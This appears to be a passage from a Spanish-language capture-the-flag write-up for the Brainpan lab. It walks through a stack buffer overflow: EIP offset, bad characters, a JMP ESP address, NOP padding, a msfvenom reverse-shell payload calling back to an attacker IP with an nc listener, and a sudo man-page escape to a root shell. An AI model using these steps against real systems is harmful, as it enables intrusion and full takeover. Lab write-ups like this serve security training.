+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">518</span>
+</span></span><span class="line"><span class="cl"><span class="n">retn</span> <span class="s2">&#34;BBBB&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Como podemos ver el EIP ha cambiado su valor a “42424242” que es “BBBB”.</p>
+<p><img src="/p/brainpain-thm/2.png"
+	width="488"
+	height="201"
+	srcset="/p/brainpain-thm/2_hu5eb1f86bc4147c0d52dff3283cfd5213_6857_480x0_resize_box_3.png 480w, /p/brainpain-thm/2_hu5eb1f86bc4147c0d52dff3283cfd5213_6857_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p>Buscamos los bad characters.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="n">mona</span> <span class="nb">bytearray</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ESP&gt;FOLLOW IN DUMP, vemos que el único caracter que no usa es el 00.</p>
+<p><img src="/p/brainpain-thm/3.png"
+	width="424"
+	height="439"
+	srcset="/p/brainpain-thm/3_hu5b85cc2aa7b63fbc41577d0cd1c56dc5_19758_480x0_resize_box_3.png 480w, /p/brainpain-thm/3_hu5b85cc2aa7b63fbc41577d0cd1c56dc5_19758_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="96"
+		data-flex-basis="231px"
+	
+></p>
+<p>Con mona podemos ver que coincide con JMP ESP. (Salto)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="n">mona</span> <span class="n">modules</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/brainpain-thm/4.png"
+	width="974"
+	height="89"
+	srcset="/p/brainpain-thm/4_hudf126c58b2a244fe734829dd73ed878f_10816_480x0_resize_box_3.png 480w, /p/brainpain-thm/4_hudf126c58b2a244fe734829dd73ed878f_10816_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1094"
+		data-flex-basis="2626px"
+	
+></p>
+<p><img src="/p/brainpain-thm/5.png"
+	width="356"
+	height="76"
+	srcset="/p/brainpain-thm/5_hud38f800cdacb7ac4afae0c68616800a4_2623_480x0_resize_box_3.png 480w, /p/brainpain-thm/5_hud38f800cdacb7ac4afae0c68616800a4_2623_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="468"
+		data-flex-basis="1124px"
+	
+></p>
+<p>por lo tanto los aplicamos a la variable &ldquo;retn&rdquo;.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf3\x12\x17\x31</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">añadimos</span> <span class="n">también</span> <span class="n">los</span> <span class="n">NOPs</span> <span class="n">en</span> <span class="n">la</span> <span class="n">variable</span> <span class="n">padding</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">16</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Creamos un payload y lo pegamos en su variable, nos ponemos en esucha con nc.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">10.11.37.230</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="n">EXITFUNC</span><span class="o">=</span><span class="n">thread</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Root</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puck</span><span class="nd">@brainpan</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> <span class="n">puck</span><span class="nd">@brainpan</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">puck</span> <span class="n">on</span> <span class="n">this</span> <span class="n">host</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">puck</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">this</span> <span class="n">host</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">anansi</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">anansi_util</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vemos que ejecutandolo nos permite poner en manual de cualquier binario , por lo tanto si llamamos al binario bash, y escrbimios !/bin/bash tendremos una shell de root.</p>
+<p><img src="/p/brainpain-thm/6.png"
+	width="986"
+	height="178"
+	srcset="/p/brainpain-thm/6_hu7a660f01d71344d126dd31621ff3102c_38404_480x0_resize_box_3.png 480w, /p/brainpain-thm/6_hu7a660f01d71344d126dd31621ff3102c_38404_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="553"
+		data-flex-basis="1329px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/blog-thm/">
+        
+        
+            <div class="article-image">
+                <img src="/p/blog-thm/logo.c2c55f16ec47fbb414fee2049a9303ac.png" 
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Blog"
+                        data-key="blog-thm" 
+                        data-hash="md5-wsVfFuxH&#43;7QU/uIEmpMDrA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Write Up Blog</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 S.x1v4n
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
